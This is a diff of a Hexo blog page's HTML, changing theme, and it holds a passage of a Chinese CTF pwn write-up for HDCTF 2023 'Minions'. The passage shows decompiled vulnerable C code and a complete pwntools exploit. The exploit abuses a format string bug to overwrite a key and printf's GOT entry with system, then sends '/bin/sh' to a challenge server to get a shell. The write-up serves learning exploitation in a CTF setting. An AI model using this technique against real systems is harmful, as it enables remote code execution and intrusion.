+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">vuln</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">208</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-D0h] BYREF</span><br><br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Welcome to HDCTF.What you name?\n&quot;</span>);<br>  read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0xD0u</span>LL);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Hello,&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">printf</span>(buf);<br>&#125;<br></code></pre></td></tr></table></figure>
 <p>还发现了一个后门</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_40075A</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;echo HDCTF&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">sub_40075A</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-keyword">return</span> system(<span class="hljs-string">&quot;echo HDCTF&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
 <p>发现格式化字符串漏洞，可以测试printf的偏移，然后将key改为102</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">p = remote(<span class="string">&#x27;node5.anna.nssctf.cn&#x27;</span>,<span class="number">24763</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./1&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">r&#x27;./1&#x27;</span>)</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment">#context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span></span><br><span class="line"> </span><br><span class="line">offset = <span class="number">6</span></span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">sys_plt = elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">start_addr = elf.sym[<span class="string">&#x27;_start&#x27;</span>]</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 利用vuln()函数里格式化字符串漏洞  覆盖key 满足 key==102</span></span><br><span class="line">key_addr = <span class="number">0x6010A0</span></span><br><span class="line">payload = fmtstr_payload(offset, &#123;key_addr: <span class="number">0x66</span>&#125;)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;name?\n&quot;</span>,payload)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 栈溢出 使函数返回 _start  为重新执行vuln()里的printf</span></span><br><span class="line">Padding = <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x30</span> + <span class="number">0x08</span>)</span><br><span class="line">payload_vuln = Padding + p64(start_addr)</span><br><span class="line">p.sendafter(<span class="string">b&quot;tell me more about you&quot;</span>,payload_vuln)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;Minions?&quot;</span>,<span class="string">b&#x27;aaa&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 利用vuln()函数里格式化字符串漏洞 修改 printf_got为system_plt</span></span><br><span class="line">payload = fmtstr_payload(offset,&#123;printf_got: sys_plt&#125;)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;name?\n&quot;</span>,payload)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 栈溢出 返回 _start重新执行 vuln()里的printf</span></span><br><span class="line">p.sendafter(<span class="string">b&quot;tell me more about you&quot;</span>,payload_vuln)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;Minions?&quot;</span>,<span class="string">b&#x27;aaa&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># send /bin/sh printf即system 调用 /bin/bash 得到shell</span></span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">b&quot;name?\n&quot;</span>,payload)</span><br><span class="line"> </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br> <br>p = remote(<span class="hljs-string">&#x27;node5.anna.nssctf.cn&#x27;</span>,<span class="hljs-number">24763</span>)<br><span class="hljs-comment">#p = process(&#x27;./1&#x27;)</span><br>elf = ELF(<span class="hljs-string">r&#x27;./1&#x27;</span>)<br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><span class="hljs-comment">#context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span><br> <br>offset = <span class="hljs-number">6</span><br>printf_got = elf.got[<span class="hljs-string">&#x27;printf&#x27;</span>]<br>sys_plt = elf.plt[<span class="hljs-string">&#x27;system&#x27;</span>]<br>start_addr = elf.sym[<span class="hljs-string">&#x27;_start&#x27;</span>]<br> <br><span class="hljs-comment"># 利用vuln()函数里格式化字符串漏洞  覆盖key 满足 key==102</span><br>key_addr = <span class="hljs-number">0x6010A0</span><br>payload = fmtstr_payload(offset, &#123;key_addr: <span class="hljs-number">0x66</span>&#125;)<br>p.sendlineafter(<span class="hljs-string">b&quot;name?\n&quot;</span>,payload)<br> <br><span class="hljs-comment"># 栈溢出 使函数返回 _start  为重新执行vuln()里的printf</span><br>Padding = <span class="hljs-string">b&#x27;A&#x27;</span> * (<span class="hljs-number">0x30</span> + <span class="hljs-number">0x08</span>)<br>payload_vuln = Padding + p64(start_addr)<br>p.sendafter(<span class="hljs-string">b&quot;tell me more about you&quot;</span>,payload_vuln)<br>p.sendlineafter(<span class="hljs-string">b&quot;Minions?&quot;</span>,<span class="hljs-string">b&#x27;aaa&#x27;</span>)<br> <br><span class="hljs-comment"># 利用vuln()函数里格式化字符串漏洞 修改 printf_got为system_plt</span><br>payload = fmtstr_payload(offset,&#123;printf_got: sys_plt&#125;)<br>p.sendlineafter(<span class="hljs-string">b&quot;name?\n&quot;</span>,payload)<br> <br><span class="hljs-comment"># 栈溢出 返回 _start重新执行 vuln()里的printf</span><br>p.sendafter(<span class="hljs-string">b&quot;tell me more about you&quot;</span>,payload_vuln)<br>p.sendlineafter(<span class="hljs-string">b&quot;Minions?&quot;</span>,<span class="hljs-string">b&#x27;aaa&#x27;</span>)<br> <br><span class="hljs-comment"># send /bin/sh printf即system 调用 /bin/bash 得到shell</span><br>payload = <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span><br>p.sendlineafter(<span class="hljs-string">b&quot;name?\n&quot;</span>,payload)<br> <br>p.interactive()<br></code></pre></td></tr></table></figure>
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/pwn-wp/" class="category-chain-item">pwn_wp</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/pwn/" class="print-no-link">#pwn</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>pwn-11月</div>
+      <div>http://example.com/2025/11/26/pwn-11/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>John Doe</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>November 26, 2025</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2025/11/26/pwn-11/1/" title="">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile"></span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
     </div>
 
-    
-    
-    
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
 
-      <footer class="post-footer">
-          <div class="post-tags">
-              <a href="/tags/pwn/" rel="tag"># pwn</a>
-          </div>
-
-        
 
 
-        
-    <div class="post-nav">
-      <div class="post-nav-item"></div>
-      <div class="post-nav-item">
-    <a href="/2025/11/26/pwn-11/1/" rel="next" title="">
-       <i class="fa fa-chevron-right"></i>
-    </a></div>
+  </aside>
+
+
     </div>
-      </footer>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
     
-  </article>
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
   
   
   
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
 
 
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
 
-          </div>
-          
 
-<script>
-  window.addEventListener('tabs:register', () => {
-    let { activeClass } = CONFIG.comments;
-    if (CONFIG.comments.storage) {
-      activeClass = localStorage.getItem('comments_active') || activeClass;
-    }
-    if (activeClass) {
-      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
-      if (activeTab) {
-        activeTab.click();
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
       }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
     }
-  });
-  if (CONFIG.comments.storage) {
-    window.addEventListener('tabs:click', event => {
-      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
-      let commentClass = event.target.classList[1];
-      localStorage.setItem('comments_active', commentClass);
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
     });
-  }
+  });
 </script>
 
-        </div>
-          
-  
-  <div class="toggle sidebar-toggle">
-    <span class="toggle-line toggle-line-first"></span>
-    <span class="toggle-line toggle-line-middle"></span>
-    <span class="toggle-line toggle-line-last"></span>
-  </div>
 
-  <aside class="sidebar">
-    <div class="sidebar-inner">
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
 
-      <ul class="sidebar-nav motion-element">
-        <li class="sidebar-nav-toc">
-          Table of Contents
-        </li>
-        <li class="sidebar-nav-overview">
-          Overview
-        </li>
-      </ul>
+  <script>Fluid.plugins.codeWidget();</script>
 
-      <!--noindex-->
-      <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#CISCN-2023-%E5%88%9D%E8%B5%9B-%E7%83%A7%E7%83%A4%E6%91%8A%E5%84%BF"><span class="nav-number">1.</span> <span class="nav-text">[CISCN 2023 初赛]烧烤摊儿</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MoeCTF-2022-babyfmt"><span class="nav-number">2.</span> <span class="nav-text">[MoeCTF 2022]babyfmt</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HDCTF-2023-Minions"><span class="nav-number">3.</span> <span class="nav-text">[HDCTF 2023]Minions</span></a></li></ol></div>
-      </div>
-      <!--/noindex-->
-
-      <div class="site-overview-wrap sidebar-panel">
-        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
-  <p class="site-author-name" itemprop="name">John Doe</p>
-  <div class="site-description" itemprop="description"></div>
-</div>
-<div class="site-state-wrap motion-element">
-  <nav class="site-state">
-      <div class="site-state-item site-state-posts">
-          <a href="/archives/">
-        
-          <span class="site-state-item-count">5</span>
-          <span class="site-state-item-name">posts</span>
-        </a>
-      </div>
-      <div class="site-state-item site-state-categories">
-            <a href="/categories/">
-          
-        <span class="site-state-item-count">1</span>
-        <span class="site-state-item-name">categories</span></a>
-      </div>
-      <div class="site-state-item site-state-tags">
-            <a href="/tags/">
-          
-        <span class="site-state-item-count">3</span>
-        <span class="site-state-item-name">tags</span></a>
-      </div>
-  </nav>
-</div>
-
-
-
-      </div>
-
-    </div>
-  </aside>
-  <div id="sidebar-dimmer"></div>
-
-
-      </div>
-    </main>
-
-    <footer class="footer">
-      <div class="footer-inner">
-        
-
-        
-
-<div class="copyright">
-  
-  &copy; 
-  <span itemprop="copyrightYear">2025</span>
-  <span class="with-love">
-    <i class="fa fa-heart"></i>
-  </span>
-  <span class="author" itemprop="copyrightHolder">John Doe</span>
-</div>
-  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a>
-  </div>
-
-        
-
-
-
-
-
-
-
-
-      </div>
-    </footer>
-  </div>
 
   
-  <script src="/lib/anime.min.js"></script>
-  <script src="/lib/velocity/velocity.min.js"></script>
-  <script src="/lib/velocity/velocity.ui.min.js"></script>
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
 
-<script src="/js/utils.js"></script>
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
 
-<script src="/js/motion.js"></script>
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
 
 
-<script src="/js/schemes/muse.js"></script>
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
 
 
-<script src="/js/next-boot.js"></script>
 
 
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
 
 
   
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-  
-
-  
-
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
 </body>
 </html>
